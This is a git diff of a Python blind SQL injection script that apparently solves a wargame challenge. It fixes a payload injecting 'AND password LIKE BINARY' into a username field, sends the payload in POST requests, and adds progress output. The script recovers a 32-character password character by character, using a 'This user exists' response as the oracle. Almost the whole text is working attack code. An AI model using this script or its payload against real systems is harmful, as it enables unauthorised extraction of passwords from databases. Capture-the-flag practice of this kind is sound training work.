@@ -21,7 +21,7 @@ def query_generator(current_password: str, character: str) -> str:
     Returns:
         str: sql query
     """
-    return f'{NAME}{" AND password LIKE BINARY "}{current_password}{character}%%" -- '
+    return f'{NAME}" AND password LIKE BINARY "{current_password}{character}%" -- '
 
 
 def get_respones(character: str) -> str:
@@ -33,13 +33,18 @@ def get_respones(character: str) -> str:
     Returns:
         str: return character if current and '' if not current
     """
-    respones = post(URL, data={}, auth=auth)
+    respones = post(
+        URL,
+        data={"username": query_generator(password, character)},
+        auth=auth
+    )
     if "This user exists" in respones.text:
         return character
     return ''
 
 
 while len(password) <= 32:
+    print(f"length: {len(password)}, password: {password}")
     for test_char in CHARS:
         char = get_respones(test_char)
         if char:
